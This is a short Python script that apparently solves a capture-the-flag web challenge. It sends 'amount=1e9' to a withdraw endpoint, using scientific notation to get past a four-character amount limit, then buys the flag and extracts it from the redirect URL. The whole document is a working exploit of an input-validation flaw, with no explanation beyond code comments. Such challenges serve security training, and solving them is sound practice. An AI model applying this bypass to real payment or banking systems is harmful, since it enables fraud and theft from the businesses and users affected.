import requests

BASE_URL = "http://ccit25.havce.it:31347/"  # Change this to the actual server URL

# Start a session to maintain cookies
session = requests.Session()

# Step 1: Withdraw 1e9 (bypassing the 4-character limit restriction)
withdraw_response = session.get(f"{BASE_URL}/withdraw?amount=1e9")
print("Withdraw response:", withdraw_response.url)

# Step 2: Buy the flag
buy_response = session.get(f"{BASE_URL}/buy?item=flag")
print("Buy response:", buy_response.url)

# Step 3: Extract the flag from the response
if "reward=" in buy_response.url:
    flag = buy_response.url.split("reward=")[1]
    print("FLAG:", flag)
else:
    print("Flag not found, something went wrong.")
